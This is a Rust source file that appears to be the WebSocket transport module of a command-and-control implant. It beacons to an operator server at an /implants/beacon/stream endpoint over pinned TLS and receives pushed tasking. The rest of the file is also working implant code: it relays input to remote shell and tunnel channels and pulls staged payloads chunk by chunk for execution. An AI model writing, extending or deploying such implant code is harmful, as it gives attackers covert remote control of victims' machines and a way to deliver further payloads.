use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::Duration;

use prost::Message;
use rustls::pki_types::ServerName;
use tungstenite::client::IntoClientRequest;
use tungstenite::protocol::Message as WsMessage;
use tungstenite::WebSocket;

use super::Contact;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, StagedPull, TaskRequest};

/// The channel tick: how long a parked read waits while a live channel
/// could have queued output, before waking to flush it. Short enough that a
/// shell's printout feels live, long enough that an idle stream with no
/// channels parks blocking (the timeout is only armed while one is live).
const CHANNEL_TICK: Duration = Duration::from_millis(200);

/// The WebSocket stream (architecture.md Sec 8, the web posture's
/// interactive tier): the same live session the mTLS gRPC stream runs, over
/// a WebSocket on a web front -- server-push tasking the moment it queues.
/// Every message is the sealed-or-plaintext framed-frames body the POST
/// cycle carries, so the seal, counter, and frame grammar are the session's
/// own, whichever carriage they ride. A dropped connection is a reconnect,
/// not a termination; undelivered results replay on the next one
/// (first-wins server-side).
///
/// The dial is deliberately hands-on: the TLS stream is ours (rustls over a
/// TcpStream, the pinned CAs as its only roots), and tungstenite runs the
/// WebSocket handshake over it -- no TLS feature entanglement, the same
/// pinning rule as the poll carriage.
pub struct Stream {
    authority: String,
    secure: bool,
    tls: Option<Arc<rustls::ClientConfig>>,
}

impl Stream {
    pub fn new(profile: &Profile) -> Stream {
        let beacon = super::beacon_url(&profile.enroll_url);
        let secure = beacon.starts_with("https://");
        let authority = match beacon.find("://") {
            Some(at) => beacon[at + 3..].split('/').next().unwrap_or("").to_string(),
            None => beacon.clone(),
        };
        let tls = if secure {
            let mut roots = rustls::RootCertStore::empty();
            for der in crate::trust::parse_pem(&profile.ca_pem) {
                let _ = roots.add(rustls::pki_types::CertificateDer::from(der));
            }
            Some(Arc::new(
                rustls::ClientConfig::builder_with_provider(Arc::new(
                    rustls::crypto::ring::default_provider(),
                ))
                .with_safe_default_protocol_versions()
                .expect("rustls protocol versions")
                .with_root_certificates(roots)
                .with_no_client_auth(),
            ))
        } else {
            None
        };
        Stream {
            authority,
            secure,
            tls,
        }
    }

    /// dials and runs the WebSocket handshake, returning the live socket.
    fn connect(&self) -> Result<WebSocket<Box<dyn ReadWrite>>, ContactError> {
        let tcp = TcpStream::connect(&self.authority)
            .map_err(|e| ContactError::Transport(format!("dial {}: {e}", self.authority)))?;
        tcp.set_nodelay(true).ok();

        let request = format!(
            "{}://{}/implants/beacon/stream",
            if self.secure { "wss" } else { "ws" },
            self.authority
        )
        .as_str()
        .into_client_request()
        .map_err(|e| ContactError::Transport(e.to_string()))?;

        let socket: Box<dyn ReadWrite> = match &self.tls {
            Some(config) => {
                let name = ServerName::try_from(
                    self.authority
                        .split(':')
                        .next()
                        .unwrap_or(&self.authority)
                        .to_string(),
                )
                .map_err(|e| ContactError::Transport(format!("server name: {e}")))?;
                let connection = rustls::ClientConnection::new(Arc::clone(config), name)
                    .map_err(|e| ContactError::Transport(e.to_string()))?;
                Box::new(rustls::StreamOwned::new(connection, tcp))
            }
            None => Box::new(tcp),
        };
        tungstenite::client(request, socket)
            .map(|(socket, _)| socket)
            .map_err(|e| ContactError::Transport(format!("websocket handshake: {e}")))
    }
}

/// The stream shapes the session loop reads and writes: either carriage of
/// the underlying transport, boxed so the socket type is one thing. The
/// read timeout is the channel tick's vehicle -- a park that can wake on
/// something other than the server's push.
trait ReadWrite: Read + Write + Send {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()>;
}

impl ReadWrite for TcpStream {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()> {
        TcpStream::set_read_timeout(self, timeout)
    }
}

impl ReadWrite for rustls::StreamOwned<rustls::ClientConnection, TcpStream> {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()> {
        self.sock.set_read_timeout(timeout)
    }
}

impl Contact for Stream {
    fn serves(&self, url: &str, mode: &str) -> bool {
        url.contains("://") && mode == "stream"
    }

    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut socket = self.connect()?;

        // The implant speaks first: the request-body shape with the
        // handshake frame alone.
        let handshake = [session.handshake_frame()];
        write_batch(&mut socket, session, &handshake)?;

        // The server answers the response shape: the handshake response
        // first, possibly beside tasking in the same message.
        let inbound = read_message(session, &mut socket)?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the stream closed before the handshake response",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        // Results whose delivery may have died with an earlier connection
        // ride this one first (the dispatch strand): the server records
        // first-wins, so a duplicate is absorbed.
        flush(&mut socket, session)?;

        // The session loop: process each message's frames, then park on the
        // next message -- pushed tasking, or the close that ends the session
        // and drops back to the run loop's reconnect cadence -- or, while a
        // live channel could have queued output, a short tick that flushes
        // it. A message holding only the handshake answer is a keep-alive.
        let outcome = serve_held(session, &mut socket, &inbound[1..], acks)
            .and_then(|()| session_loop(session, &mut socket, acks));

        // The stream's death ends every channel it carried (the wire
        // contract's session-scoped lifetime): the shells are killed, the
        // tunnels close, and their results never come -- the tasks stay
        // dispatched for the operator to reissue on a later contact.
        session.channels.reap();
        // The session loop parks forever; the only way out is the stream's
        // death, a dropped contact the run loop retries on its walk.
        outcome.map(|()| Attempt::Crossed)
    }
}

/// One message's held frames: channel input routes to the live channel it
/// names, tasking is accepted (the staged arm runs inline), and each
/// acceptance is flushed the moment it happens -- the mark-on-write
/// delivery rule.
fn serve_held(
    session: &mut Session,
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
    frames: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    for frame in frames {
        if frame.kind() == FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if let Some(task) = parse_task(frame) {
            if task.staged_bytes.is_some() {
                run_staged(session, socket, &task)?;
            } else {
                session.accept(&task, acks);
                flush(socket, session)?;
            }
        }
    }
    Ok(())
}

/// The parked half of the session loop: channel output is drained and
/// flushed on every wake, and the park itself blocks while no channel is
/// live (nothing but the server's push can wake us) or ticks while one is
/// (its pumps queue output the flush must not sit on).
fn session_loop(
    session: &mut Session,
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
    acks: bool,
) -> Result<(), ContactError> {
    loop {
        session.drain_channels();
        flush(socket, session)?;
        let _ = socket
            .get_ref()
            .set_read_timeout(if session.channels.any_live() {
                Some(CHANNEL_TICK)
            } else {
                None
            });
        match read_next(session, socket)? {
            Incoming::Message(frames) => serve_held(session, socket, &frames, acks)?,
            Incoming::Tick => {}
        }
    }
}

/// Parses one downstream frame as tasking. Channel input is the caller's
/// to route (it is the only kind-bearing downstream frame); everything else
/// parses as a TaskRequest or the frame is skipped.
fn parse_task(frame: &Frame) -> Option<TaskRequest> {
    if frame.kind() != FrameKind::Unspecified {
        return None;
    }
    TaskRequest::decode(frame.payload.as_ref()).ok()
}

/// Writes whatever the session has queued since the last write, marking it
/// delivered: on the stream, a frame that left the socket counts as
/// delivered (the wire-writing carriers' mark-on-write rule).
fn flush(
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
    session: &mut Session,
) -> Result<(), ContactError> {
    let batch = session.outbox.batch();
    if batch.is_empty() {
        return Ok(());
    }
    write_batch(socket, session, &batch)?;
    session.outbox.batch_crossed(batch.len());
    Ok(())
}

fn write_batch(
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
    session: &mut Session,
    frames: &[Frame],
) -> Result<(), ContactError> {
    let (body, _) = session.encode_outgoing(frames);
    // Sealed bodies ride as text (the base64 string), plaintext as binary --
    // the exact message typing the wire contract sets.
    let message = if session.seal.is_some() {
        WsMessage::Text(String::from_utf8_lossy(&body).into_owned().into())
    } else {
        WsMessage::Binary(body.into())
    };
    socket
        .send(message)
        .map_err(|e| ContactError::Transport(e.to_string()))
}

/// The next thing a parked read produces: a decoded message, or the tick.
enum Incoming {
    Message(Vec<Frame>),
    Tick,
}

/// Reads the next message off the socket, blocking until one arrives -- a
/// tick under a ticked timeout is retried, not returned (the handshake and
/// the staged arm want messages, and neither runs a live channel's flush).
fn read_message(
    session: &Session,
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
) -> Result<Vec<Frame>, ContactError> {
    loop {
        if let Incoming::Message(frames) = read_next(session, socket)? {
            return Ok(frames);
        }
    }
}

/// One read off the socket: the next data message as decoded frames, or a
/// tick when the read timeout fired -- the wake the channel flush rides.
fn read_next(
    session: &Session,
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
) -> Result<Incoming, ContactError> {
    let body = loop {
        match socket.read() {
            Ok(WsMessage::Text(text)) => break text.as_bytes().to_vec(),
            Ok(WsMessage::Binary(bytes)) => break bytes.as_ref().to_vec(),
            Ok(WsMessage::Close(_)) => {
                return Err(ContactError::Protocol("the server closed the stream"))
            }
            // Control frames answer themselves inside tungstenite's read.
            Ok(WsMessage::Ping(_) | WsMessage::Pong(_) | WsMessage::Frame(_)) => continue,
            Err(error) if is_read_tick(&error) => return Ok(Incoming::Tick),
            Err(e) => return Err(ContactError::Transport(e.to_string())),
        }
    };
    session
        .decode_incoming(&body)
        .map(Incoming::Message)
        .ok_or(ContactError::Protocol(
            "the beacon message did not verify under the baked key",
        ))
}

/// Whether a failed read is the read-timeout tick rather than a dead
/// socket: the timeout surfaces as WouldBlock (or TimedOut) through the
/// underlying stream, and tungstenite passes it through as an io error.
fn is_read_tick(error: &tungstenite::Error) -> bool {
    matches!(
        error,
        tungstenite::Error::Io(e)
            if e.kind() == std::io::ErrorKind::WouldBlock
                || e.kind() == std::io::ErrorKind::TimedOut
    )
}

/// The staged arm on the stream: demand the payload, then block on the
/// messages until its terminal chunk -- the blocking model makes the
/// exchange a plain loop, nothing interleaves.
fn run_staged(
    session: &mut Session,
    socket: &mut WebSocket<Box<dyn ReadWrite>>,
    task: &TaskRequest,
) -> Result<(), ContactError> {
    let demand = [Frame {
        payload: StagedPull {
            task_id: task.task_id.clone(),
        }
        .encode_to_vec(),
        kind: FrameKind::StagedPull as i32,
    }];
    write_batch(socket, session, &demand)?;

    let mut payload: Vec<u8> = Vec::new();
    loop {
        for frame in read_message(session, socket)? {
            if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
                if chunk.task_id == task.task_id {
                    payload.extend_from_slice(&chunk.data);
                    if chunk.terminal {
                        let (outcome, output) =
                            super::http::dispatch_staged(&task.verb, &task.arguments, &payload);
                        session.outbox.result(&task.task_id, outcome, &output);
                        return Ok(());
                    }
                }
            }
        }
    }
}
